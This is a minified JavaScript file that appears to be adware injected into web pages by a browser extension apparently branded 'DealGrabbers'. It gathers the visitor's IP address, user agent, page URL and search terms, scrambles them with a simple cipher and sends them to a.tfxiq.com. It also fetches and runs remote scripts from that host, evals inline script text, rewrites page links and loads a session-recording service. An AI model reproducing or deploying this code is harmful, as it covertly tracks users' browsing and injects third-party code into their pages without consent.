(function(a,b,c,d,e,f){
	a[f]=a[f]||{};
	if(a[f][e.a.ref1]) return;
	a[f][e.a.ref1]=1;
	function k(y,x,w,v){y='prototype';x='appendChild';w='insertBefore';v='createElement';if(a.Node&&a.Element){if(Node[y][x]!=Element[y][x]) Element[y][x]=Node[y][x];if(Node[y][w]!=Element[y][w]) Element[y][w]=Node[y][w];}if(a.Document&&a.Document[y][v]!=b[v]){b[v]=Document[y][v]}}k();
	var z=(function(a,b){var c=b.createElement("div"),d={a:Math.random().toString(36).slice(3),b:new Date().getTime()},e=encodeURIComponent,f,g,h,i,j="b",k="d",l,m,n,z;z=function(x,y){return new z.O().init(x,y)};z.O=function(){};z.O.prototype={init:function(x,y){return g.a.call(this,x,y)},each:function(y){h.a(this[0],y,this)},append:function(y){h.b.call(this,y,"a")},removeChild:function(y){h.b.call(this,y,"f")},val:function(y){return h.d.call(this,"value",y,"m")},attr:function(x,y){return h.d.call(this,x,y,"m")},html:function(y){return h.d.call(this,"innerHTML",y,"o")},before:function(y){h.j.call(this,y,"j")},after:function(y){h.j.call(this,y,"k")},replace:function(y){h.j.call(this,y,"p")},remove:function(){h.c.call(this,"q")},children:function(){return h.n.call(this,"children")},childNodes:function(){return h.n.call(this,"childNodes")},bind:function(w,x,y){h.c.call(this,j,w,x,y)},unbind:function(w,x,y){h.c.call(this,k,w,x,y)},width:function(){return h.e.call(this,"Width")},height:function(){return h.e.call(this,"Height")},size:function(){return h.g.call(this)},locationSize:function(){return h.k.call(this)},aLocation:function(){return h.h.call(this,"g")},rLocation:function(){return h.h.call(this,"h")},css:function(x,y){h.i.call(this,x,y)},drag:function(y){h.f.call(this,y)},animationChange:function(y){h.l.call(this,y)},animationGradient:function(y){h.m.call(this,y)}};g={a:function(x,y){switch(typeof x){case"object":this[0]=g.b.call(this,x);return this;case"string":x=x.trim();var v=x.charAt(0)+"*",w=g[v]&&g[v]()||g["*"]();this[0]=g.z(x,y,w);return this}},b:function(y){return g.x(y)&&y||[y]},c:function(y){if(y.nodeType){y.nodeType.z=this}return y},d:function(x,y){return f[y.nodeType].call(y,x)},e:function(y){y=y.substring(1);return[b.getElementById(y)]},f:function(x,y){var u=g.y(x),v=0,w;for(;w=u[v];v++){y.appendChild(w)}return u},g:function(y){return g.y(y)},w:function(y){return y instanceof z.O},x:function(y){return y instanceof Array||y instanceof NodeList},y:function(y){var u=[],v=0,w,x;c.innerHTML=y;w=c.childNodes;for(;x=w[v];v++){u.push(x)}return u},z:function(w,x,y){return x&&y.a(w,x)||y.b(w,x||b)},"#*":function(){return{a:this.d,b:this.e}},"<*":function(){return{a:this.f,b:this.g}},"*":function(){return{a:this.d,b:this.d}}};h={a:function(){var u,v=0,t=arguments,w=t[0],x=t[1],y=i.z(2,t);for(;u=w[v];v++){x(u,y)}},b:function(y,w,x){x=this[0][0];y=g.w(y)?y[0]:y;g.x(y)?h.a(y,i[w],x):i[w](y,[x])},c:function(v,w,x,y){h.a(this[0],i[v],w,x,y)},d:function(w,x,y){return x!==undefined?h.a(this[0],i[y],w,x):i.n(this[0][0],w)},e:function(y){return this[0][0]["offset"+y]},f:function(y,w,x){w=y.moveLayer;x=y.bgLayer;y.moveLayer=g.w(w)?w:z(w);x=x||b.body;y.bgLayer=g.w(x)?x:z(x);i.l(this,y)},g:function(){return{width:h.e.call(this,"Width"),height:h.e.call(this,"Height")}},h:function(y){return i[y](this[0][0])},i:function(x,y){if(y===undefined){y=x;x="cssText"}h.a(this[0],i.i,x,y)},j:function(w,x,y){y=this[0][0];w=g.w(w)?w[0][0]:w;i[x](y,w)},k:function(y){y=h.g.call(this);y.left=h.e.call(this,"Left");y.top=h.e.call(this,"Top");return y},l:function(y){clearInterval(this.setInterval1);var x=y.ms*n.a,w=this.locationSize(),v=this,u=y.style,t={},s=y.ms/x;for(var p in u){t[p]=(u[p]-w[p])/x}this.setInterval1=setInterval(function(){if(x--<=0){clearInterval(v.setInterval1);for(var p in u){v.css(p,u[p]+"px")}y.afterChange&&y.afterChange(v);return}for(var p in u){w[p]+=t[p];v.css(p,w[p]+"px")}y.changing&&y.changing(v);},s)},m:function(y){clearInterval(this.setInterval2);var x=y.ms*n.a,s=y.ms/x,v=y.start,t=y.end,w=(t-v)/x,u=this;this.setInterval2=setInterval(function(){if(x--<=0){clearInterval(u.setInterval2);u.css("opacity",t);u.css("filter","alpha(opacity="+(t*100)+")");y.afterChange&&y.afterChange(u);return}v+=w;u.css("opacity",v);u.css("filter","alpha(opacity="+(v*100)+")");y.changing&&y.changing(u);},s)},n:function(y){return this[0][0][y]}};i={a:function(x,y){y[0].appendChild(x)},b:function(x,y){x.addEventListener(y[0],y[1],y[2])},c:function(x,y,w){w=l.a(x,y);x.attachEvent("on"+y[0],w)},d:function(x,y){x.removeEventListener(y[0],y[1],y[2])},e:function(x,y,w){w=d.a;x.detachEvent("on"+y[0],x[w][y[0]][y[1][w]])},f:function(x,y){y[0].removeChild(x)},g:function(x,y,v,w){v=0;w=0;do{v+=x.offsetLeft;w+=x.offsetTop}while(x=x.offsetParent);return{left:v,top:w}},h:function(y){return{left:y.offsetLeft,top:y.offsetTop}},i:function(x,y){x.style[y[0]]=y[1]},j:function(x,y){x.parentNode.insertBefore(y,x)},k:function(w,x,y){y=w.nextSibling;y?this.j(y,x):w.parentNode.appendChild(x)},l:function(x,y){x.bind("mousedown",l.b);h.a(x[0],l.c,y)},m:function(x,y){x.setAttribute(y[0],y[1])},n:function(x,y){return x.getAttribute(y)},o:function(x,y,w,v){x[y[0]]='<span style="display:none">z</span>'+y[1];w=z("script",x);w.each(l.f)},p:function(x,y){x.parentNode.replaceChild(y,x)},q:function(y){y.parentNode.remove(y)},z:function(v,w,x,y){x=[];for(;(y=w[v])||y!==undefined;v++){x.push(y)}return x}};l={a:function(x,y){var u=d.a,v,w=y[0],s=y[1],t=x[u]=x[u]||{};t[w]=t[w]||{};s[u]=s[u]||d.b++;t[w][s[u]]=function(y){s.call(x)};return t[w][s[u]]},c:function(x,y,w){w=d.a;x[w]=x[w]||{};x[w].temp=y[0]},f:function(y){if(y.src){var x=b.createElement("script");x.src=y.src;y.parentNode.replaceChild(x,y)}else{eval(y.text)}}};n={a:0.06};z.windowDimension=function(y){y=y||a;return{width:b.documentElement.clientWidth||a.innerWidth||b.body.clientWidth,height:b.documentElement.clientHeight||a.innerHeight||b.body.clientHeight,left:b.documentElement.scrollLeft||b.body.scrollLeft,top:b.documentElement.scrollTop||b.body.scrollTop}};z.c=function(w,x,y){y=b.createElement(w);for(var k in x){y[k]=x[k]}return y};z.head=b.getElementsByTagName("head")[0];z.script=function(y,x){x=z.c("script",{src:y});z.head.appendChild(x);return x};z.css=function(x,y){y=z.c("style",{type:"text/css"});y.styleSheet?y.styleSheet.cssText=x:y.appendChild(b.createTextNode(x));z.head.appendChild(y)};z.getCookie=function(w,x,y){var x=new RegExp('(^| )'+w+'=([^;]*)(;|$)'),y=b.cookie.match(x);return y&&y[2]||null;};z.scrollTop=function(){return b.documentElement.scrollTop||b.body.scrollTop};f=a.Document?(function(a){a=Element.prototype.querySelectorAll;return{"1":a,"4":a,"9":Document.prototype.querySelectorAll}})():(function(s,w){s=b.createStyleSheet();w=function(r,c,i,j,a){a=this.getElementsByTagName("*"),c=[],r=r.replace(/\[for\b/gi,"[htmlFor").split(",");for(i=r.length;i--;){s.addRule(r[i],"k:v");for(j=a.length;j--;){a[j].currentStyle.k&&c.push(a[j])}s.removeRule(0)}return c};return{"1":w,"4":w,"9":w}})();if(!String.prototype.trim){String.prototype.r=/^\s+|\s+$/g;String.prototype.trim=function(){return this.replace(this.r,"")}}if(!a.NodeList){NodeList=function(){}}if(!a.addEventListener){j="c";k="e"}return z})(a,b),
	g=new Date().getTime(),h,j=e.a.tfsid.replace(/\.|\d/g,''),k=e.a.tfsid,l,m='t_c_b'+g++,n,o,p=encodeURIComponent,T,
	A=function(){};
	var meg=[],spd={},kdsw="";
	var tfx_ev=(function(){function b(){}b.prototype.on=function(k,n,i){var l,j,a;if(!n){return this}l=this.__events||(this.__events={});k=k.split(/\s+/);while(j=k.shift()){a=l[j]||(l[j]=[]);a.push(n,i)}return this};b.prototype.off=function(m,k,a){var p,n,l,i;if(!(p=this.__events)){return this}if(!(m||k||a)){delete this.__events;return this}m=m?m.split(/\s+/):this._keys(p);while(n=m.shift()){l=p[n];if(!l){continue}if(!(k||a)){delete p[n];continue}for(i=l.length-2;i>=0;i-=2){if(!(k&&l[i]!==k||a&&l[i+1]!==a)){l.splice(i,2)}}}return this};b.prototype._keys=function(f){var a=Object.keys;if(!a){a=function(d){var i=[];for(var h in d){if(d.hasOwnProperty(h)){i.push(h)}}return i}}return a(f)};b.prototype._triggerEvents=function(i,a,p){var t=true;if(i){var l=0,n=i.length,o=a[0],q=a[1],r=a[2];switch(a.length){case 0:for(;l<n;l+=2){t=i[l].call(i[l+1]||p)!==false&&t}break;case 1:for(;l<n;l+=2){t=i[l].call(i[l+1]||p,o)!==false&&t}break;case 2:for(;l<n;l+=2){t=i[l].call(i[l+1]||p,o,q)!==false&&t}break;case 3:for(;l<n;l+=2){t=i[l].call(i[l+1]||p,o,q,r)!==false&&t}break;default:for(;l<n;l+=2){t=i[l].apply(i[l+1]||p,a)!==false&&t}break}}return t};b.prototype.ecy=function(l){var h={a:"o",b:"g",c:"0",d:"b",e:"a",f:"9",g:"1",h:"5",i:"u",j:"x",k:"n",l:"2",m:"4",n:"z",o:"q",p:"6",q:"c",r:"d",s:"e",t:"f",u:"h",v:"i",w:"j",x:"k",y:"l",z:"t","0":"8","1":"v","2":"m","3":"r","4":"w","5":"3","6":"y","7":"7","8":"s","9":"p"};var f="";if(l){var g=l.length;for(var a=0;a<g;a++){if(l[a]&&h[l[a]]){f+=h[l[a]]}else{f+=l[a]}}}return f};b.prototype.ck=function(f){var a=location.href;if(/&tbm=vid&/gi.test(a)&&f=="0"){return false}return true};b.prototype.trigger=function(o){var n,i,p,r,t,s,a=[],q,v=true;if(!(n=this.__events)){return this}o=o.split(/\s+/);for(t=1,s=arguments.length;t<s;t++){a[t-1]=arguments[t]}while(i=o.shift()){if(p=n.all){p=p.slice()}if(r=n[i]){r=r.slice()}if(i!=="all"){v=this._triggerEvents(r,a,this)&&v}v=this._triggerEvents(p,[i].concat(a),this)&&v}return v};b.prototype.im=function(a){var T={serp1:1,serp0:2,site_link1:3,site_link0:4,rs1:5,rs0:6,shopping1:7,shopping0:8},E="",s=[];for(var i in T){if(a[i]){T[i]=T[i]+"_"+a[i][1]}else{delete T[i]}}for(var C in T){s.push(T[C])}E=s.join(",");var K=document.createElement("script"),D=e.a,L=D.ref1,M=D.ref2,N=D.ref3,I=D.teid,F=D.tuid,J=D.cc,G=D.uuid,p=D.tfsid,H=D.user_ip,O=D.user_agent,P=location.href,j="[%23:]";var R=j+L+j+M+j+N+j+F+j+I+j+J+j+G+j+p+j+encodeURIComponent(kdsw)+j+E+j+H+j+encodeURIComponent(O)+j+encodeURIComponent(P);var Q='//a.tfxiq.com/im.php?ri='+encodeURIComponent(this.ecy(R));K.src=Q;document.getElementsByTagName("head")[0].appendChild(K)};var c=new b();c.data={xml:1,rtb:2,rtjs:3,rtxml:4,netseer:5,shopping:6,"default":7};return c})();
	tfx_ev.on("im",function(data){
	    var _this=this;
	    if(typeof data ==="string"){
	       kdsw=data;
	    }else{
	       meg.push(data);
	    }
	    spd[data[0]+data[2]]=data;
	    if(meg.length==1){
			    var to=setTimeout(function(){
		          _this.im(spd);
		          meg=[],spd={};
		      },2000);
      }
	});
	A.prototype={
		z:function(e,y){
			e.a.CRPName=e.c?h.a():e.a.CRPName;
			e.a.callback=m;y=this.y.a=this;
			a[m]=function(x){
				x&&x.type&&y[x.type[0]].cb(x);
			};
			h.b.call(this,e);
		},
		y:function(y){
			a[y]=null;
			return [z,arguments.callee.a,h,e,j,k,p,tfx_ev];
		},
		x:function(y,x,o){
			x=c.href;o=this;
			setInterval(function(w,v,u){
				if(c.href!=x){
					x=c.href;w=y;
					for(v in w){
						w[v]&&o[v].ss(e);
					}
				}
			},300);
		},
		w:function(y,x){
			if(!e.ss){
				e.ss={};
				this.x(e.ss);
			}
			e.ss[y]=x;
		}
	};
	h={
		a:function(){
			try{return window['__rvzbsrchpo'].product_name;}catch(e){return '';} 
		},
		b:function(e,y,x,w,v,u){
			y=e.b;x='&'+h.c(['callback','pid','rc','rc_'])+'&page_url='+p(location.href);
			for(w=0;v=y[w];w++){
				u=h.j()+g++;
				a[u]=this.y;
				z.script('//'+v+'cb='+u+x);
			}
		},
		c:function(w,x,y,v,u){
			x=new RegExp('^('+w.join('|')+')$','i'),y=e.a,v=[];
			for(u in y){
				if(!x.exec(u)){
					v.push(u+'='+p(y[u]));
				}
			}
			return v.join('&');
		},
		d:function(y,x,w){
			x='';
			for(w in y){
				x+=w+'='+y[w]+';';
			}
			b.cookie=x;
		},
		e:function(y){
			y=y||a.event;
			y.stopPropagation?y.stopPropagation():y.cancelBubble=true;
		},
		f:function(y,x,w,v,u,t,s,r,p,o,n,m,l,k){
			s='display';r='none';o='click';n=this;m=n[1];
			p=function(){w.css(s,r);z(b.body).unbind('click',p)};
			l=function(){n[11]=this.value;v.removeAttribute('disabled')};
			w.bind(o,function(q){h.e(q)});
			x.bind(o,function(q){h.e(q);w[0][0].style[s]==r?(w.css(s,'block')|z(b.body).bind('click',p)):p()});
			z(v).bind(o,function(j){z.script(m.n+'?'+h.c(['rc_','rc','callback']).replace(/&ref/g,'&626ref').replace(/&CRPName/,'&626Name')+'&n='+m.m+'&d='+n[11]);j=y[0][0];j.parentNode.removeChild(j);w[0][0].parentNode.removeChild(w[0][0])});
			for(k=0;k<t;k++){
				u[k].onclick=l;
			}
		},
		g:function(y,x,w){
			/**w=e.a;
			x=z.c('img',{height:'1px',width:'1px',src:d+'/m.php?ld='+p(y)+'&teid='+w.teid+'&tuid='+w.tuid});
			z.head.appendChild(x);*/
		},
		h:function(y){
			y&&y.preventDefault?y.preventDefault():a.event.returnValue=false;
			return false; 
		},
		i:function(y,x){
			x=new Date();
			x.setTime(x.getTime()+y*3600000);
			return x.toGMTString();
		},
		j:function(y){
			y=Math.random().toString(26);
			return y.slice(y.length - 14);
		},
		k:function(y,x,w,v,u,t){
			w=/^(#|javascript)/;v=y.getElementsByTagName('a');
			for(u=0;t=v[u];u++){
				if(w.test(t.getAttribute('href'))) continue;
				t[j]=x;
			}
		},
		Hour:function(y){
			return y+' Hour';
		},
		Day:function(y){
			return (y/24)+' Day';
		},
		Week:function(y){
			return (y/168)+' Week';
		},
		Year:function(y,x){
			x=Math.ceil(y/24/365);
			return x<10&&(' '+x+' Year')||' Permanently';
		}
	};
	new A().z(e);
	
	//ttttt
	if(e.ccabe){
		a.__insp=a.__insp||[];
		__insp.push(['wid',313579092]);
		ss=z.script('//cdn.inspectlet.com/inspectlet.js');
		ss.id='inspsync';
	}
	//ttttt
})(window,document,location,'//a.tfxiq.com',{"a":{"rc":3,"rc_":3,"user_ip":"103.225.189.235","cc":"IN","ref1":"63726f73737269646572","ref2":"200303810329000000","ref3":"14d717e85eeb2c7289936518bdf5fa24","teid":"75207","tuid":"null","tfsid":"32d13ed02bbd9857740e660698c014e6","CRPName":"DealGrabbers","uuid":"23095d3cb02c409e657117e02950334c","user_agent":"Mozilla\/5.0 (Windows NT 6.1) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/41.0.2272.118 UBrowser\/5.0.1369.1031 Safari\/537.36","pid":"106"},"b":["a.tfxiq.com\/c.php?f=2057&"],"c":false},'!)(@#*&$%^')